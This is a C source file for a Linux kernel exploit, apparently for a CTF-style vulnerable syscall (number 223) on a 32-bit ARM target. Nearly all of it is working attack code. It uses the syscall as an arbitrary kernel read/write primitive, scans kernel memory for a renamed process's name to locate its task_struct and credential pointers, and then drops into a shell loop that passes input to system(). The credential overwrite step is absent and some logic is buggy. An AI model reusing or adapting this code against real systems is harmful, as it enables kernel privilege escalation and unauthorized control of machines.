#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <unistd.h>

#ifndef __arm__
    #include <sys/prctl.h>
#endif

#define syscall_num 223
#define MAX_BUFF_SIZE (1024 * 1024 * 20)
#define PROCESS_NAME "PURPLE_CASTLE"
#define START_KERNEL_ADDR (0x80000000)
#define MAX_KERNEL_ADDR (0x869e0000)
#define MINIMUM_CRED_PTR START_KERNEL_ADDR

typedef uint8_t u8;

void shell();

void invoke_exploit(void* src, void* dst) {
    syscall(syscall_num, src, dst);
}

void kernel_write_string(char* src, size_t dst) {
    invoke_exploit(src, (void*)dst);
}

void kernel_write_byte(u8 c, size_t dst) {
    char buff[2] = {c, 0};
    if (c == 0 || (c >= 0x60 && c <= 0x7b)) {
        printf("<WARNING> Writing to kernel may fail : %c\n", c);
        fflush(stdout);
    }

    invoke_exploit(buff, (void*)dst);
}

// return a pointer to a buffer that contains the data of
// no-less than len size
void* read_kernel_memory(size_t addr, size_t len, void* buff) {
    if (buff == NULL)
        buff = calloc(MAX_BUFF_SIZE, 1);
    else
        memset(buff, 0, MAX_BUFF_SIZE);
    if (buff == NULL) {
        printf("Unable to allocate memory");
        fflush(stdout);
        return NULL;
    }
    size_t read = 0;
    size_t read_now = 0;

    while (read < len) {
        invoke_exploit((void*)(addr + read), buff + read);
        read_now = strlen(buff + read);
        if (read_now == 0) {
            read++;
        } else {
            read += read_now;
        }
    }
    return buff;
}

size_t scan_kernel_memory_for_string(
    size_t starting_addr,
    size_t max_addr,
    char* str
) {
    printf("Searching for %s in %lu - %lu\n", str, starting_addr, max_addr);
    fflush(stdout);
    size_t chunk = MAX_BUFF_SIZE / 100;
    size_t size = max_addr - starting_addr;
    char* buff = (char*)calloc(1000, 1);
    size_t c, i, bytes_read = 0;
    char* raw_bytes = NULL;
    for (bytes_read = 0; bytes_read < size; bytes_read += chunk) {
        char* raw_bytes =
            read_kernel_memory(starting_addr + bytes_read, chunk, raw_bytes);
        for (i = 0; i < chunk; i++) {
            char b = raw_bytes[i];
            if (b >= 0x20 && b <= 0x7e) {
                buff[c++] = b;
            } else if (c != 0) {
                buff[c] = '\0';
                if (strcmp(buff, str) == 0) {
                    return starting_addr + i + bytes_read - c;
                }
                c = 0;
            }
        }
    }
    return 0;
}

// Get address of string in kernel memory, return true if liekly to be comm of process.
bool is_proc_comm(size_t addr) {
    void* mem = read_kernel_memory(addr - 8, 8, NULL);
    uint32_t* real_cred_ptr = mem;
    uint32_t* cred_ptr = mem + 4;
    printf(
        "Possible task_sturct of %s at %p, real_cred=%p, cred=%p\n",
        (char*)addr,
        (void*)addr,
        real_cred_ptr,
        cred_ptr
    );
    fflush(stdout);
    if (*real_cred_ptr > MINIMUM_CRED_PTR && *cred_ptr > MINIMUM_CRED_PTR
        && *real_cred_ptr == *cred_ptr) {
        free(mem);
        return true;
    }
    free(mem);
    return false;
}

size_t find_proc_comm_addr(char* comm) {
    size_t addr = 0;

    while (1) {
        addr = scan_kernel_memory_for_string(
            START_KERNEL_ADDR,
            MAX_KERNEL_ADDR,
            comm
        );

        if (addr == 0) {
            return 0;
        }

        // Found possible match
        if (is_proc_comm(addr)) {
            return addr;
        }
    }

    return 0;
}

int main(int argc, char** argv) {
    prctl(15, PROCESS_NAME, 0, 0, 0);

    char* proc1 = "LINUXRC";
    char* proc2 = PROCESS_NAME;

    printf("proc1 comm is at %lu", find_proc_comm_addr(proc1));
    fflush(stdout);
    printf("proc2 comm is at %lu", find_proc_comm_addr(proc2));
    fflush(stdout);

    shell();
}

void shell() {
    char command[100] = {0};
    int r = 0;
    while (1) {
        printf("$ ");
        fflush(stdout);
        r = read(0, command, 99);
        command[r] = '\0';
        if (strncmp(command, "Stop", 4) == 0)
            break;
        system(command);
    }
}
